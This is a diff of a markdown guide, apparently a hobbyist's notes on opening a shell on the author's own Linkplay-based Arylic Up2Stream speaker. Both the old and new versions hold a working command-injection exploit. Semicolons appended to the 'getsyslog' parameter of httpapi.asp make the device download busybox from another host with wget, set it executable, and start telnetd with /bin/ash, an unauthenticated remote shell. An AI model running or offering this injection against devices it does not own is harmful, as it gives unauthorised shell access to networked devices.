@@ -7,15 +7,14 @@ If your Linkplay device is running a newer version, you may have to downgrade th
 
 The following code snippets are using the IP address 10.1.1.58 for my Arylic Up2Stream device and 10.1.1.22 for a web server running on my local MacMini. You need to create the subdirectories on your web server and copy the busybox binary to it. On my Mac mini it's the directory ***/Library/WebServer/Documents/linkplay*** that is accessible as http://10.1.1.22/linkplay. To organize all the files on my web server I've created several subdirectories below to store the binary file (***.../linkplay/a31/bin/busybox***).
 ```
-curl "http://10.1.1.58/httpapi.asp?command=getsyslog:ip:10.1.1.22/index.html;mkdir+/tmp/bin;wget+-O+/tmp/bin/busybox+-T+5+http://10.1.1.22/linkplay/a31/bin/busybox+-q;chmod+555+/tmp/bin/busybox;ln+-s/tmp/bin/busybox+/tmp/bin/telnetd;/tmp/bin/telnetd+telnetd+-l/bin/ash;"
+curl "http://10.1.1.58/httpapi.asp?command=getsyslog:ip:10.1.1.22/index.html;mkdir+/tmp/bin;wget+-O+/tmp/bin/busybox+-T+5+http://10.1.1.22/linkplay/a31/bin/busybox+-q;chmod+555+/tmp/bin/busybox;/tmp/bin/busybox+telnetd+-l/bin/ash;"
 ```
 The command above is executing the following commands on the device in addition to the "getsyslog" request:
 ```
 mkdir /tmp/bin
 wget -O /tmp/bin/busybox -T 5 http://10.1.1.22/linkplay/a31/bin/busybox -q;
 chmod 555 /tmp/bin/busybox;
-ln -s /tmp/bin/busybox /tmp/bin/telnetd;
-/tmp/bin/telnetd telnetd -l/bin/ash;
+/tmp/bin/busybox telnetd -l/bin/ash;
 ```
 > **Note:**
 > Don't forget to add a ";" at the end inside the quotes. Replace all spaces with "+" if you want to create your own URL with curl.
